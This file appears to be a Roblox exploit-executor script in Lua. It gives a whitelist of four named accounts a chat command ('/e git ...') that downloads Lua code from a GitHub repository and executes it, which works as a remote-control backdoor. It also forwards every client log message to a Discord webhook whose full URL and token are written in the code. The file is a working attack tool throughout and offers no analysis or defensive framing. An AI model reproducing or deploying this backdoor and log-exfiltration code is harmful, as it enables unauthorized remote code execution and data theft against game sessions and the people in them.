local Players = game:GetService("Players")
local LogService = game:GetService("LogService")
function table_to_string(tbl)
    local result = "{"
    for k, v in pairs(tbl) do
        -- Check the key type (ignore any numerical keys - assume its an array)
        if type(k) == "string" then
            result = result.."[\""..k.."\"]".."="
        end

        -- Check the value type
        if type(v) == "table" then
            result = result..table_to_string(v)
        elseif type(v) == "boolean" then
            result = result..tostring(v)
        else
            result = result.."\""..v.."\""
        end
        result = result..","
    end
    -- Remove leading commas from the resultS
    if result ~= "" then
        result = result:sub(1, result:len()-1)
    end
    return result.."}"
end
local function __main__(user)
	user.Chatted:Connect(function(_)
		local __ = _:split(" ")
		if __[1] == "/e" then
			if __[2] == "git" and __[3] then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/p4re/chat-bot/main/"..__[3]..".lua"))();
            end
		end
	end)
end
local Whitelist = {
	["catalogizes"] = true,
	["Forekara"] = true,
	["4DBug"] = true,
	["watchbeebed12"] = true
}
request = http_request or request or HttpPost or syn.request

local LogService = game:GetService("LogService")
LogService.MessageOut:Connect(function(Message, Type)
   request({
      Url = "https://discord.com/api/webhooks/1227040757429309582/rre001Xt_OFG1gtOx1s9Dk6QkbeBIIqCTdGceys9anxu5pGkOhn6ooSG_6pDMZ69kbQ5", 
      Body = game:GetService("HttpService"):JSONEncode({
         content = string.format("[%s] %s", string.upper(Type), Message)
      }),
      Method = "POST", 
      Headers = {
         ["content-type"] = "application/json"
      }      
   })
end)

for _,Player in next, Players:GetChildren() do
	if Whitelist[Player.Name] then
		__main__(Player)
	end
end
Players.ChildAdded:Connect(function(Player)
	if Whitelist[Player.Name] then
		__main__(Player)
	end
end)
